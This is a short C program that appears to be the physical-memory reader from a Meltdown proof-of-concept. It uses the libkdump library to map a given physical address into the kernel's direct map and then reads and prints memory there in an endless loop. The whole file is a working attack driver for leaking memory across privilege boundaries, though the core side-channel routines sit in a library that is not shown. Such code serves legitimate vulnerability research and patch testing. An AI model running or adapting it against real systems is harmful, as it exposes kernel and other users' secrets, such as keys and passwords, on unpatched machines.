#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
  size_t phys;
  if (argc < 2) {
    printf("Usage: %s <physical address> [<direct physical map>]\n", argv[0]);
    return 0;
  }

  phys = strtoull(argv[1], NULL, 0);

  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  if (argc > 2) {
    config.physical_offset = strtoull(argv[2], NULL, 0);
  }

  libkdump_init(config);

  size_t vaddr = libkdump_phys_to_virt(phys);

  printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
  printf("\x1b[32;1m[+]\x1b[0m Physical offset        : \x1b[33;1m0x%zx\x1b[0m\n", config.physical_offset);
  printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);

  while (1) {
    int value = libkdump_read(vaddr);
    printf("%c", value);
    fflush(stdout);
    vaddr++;
  }

  libkdump_cleanup();

  return 0;
}
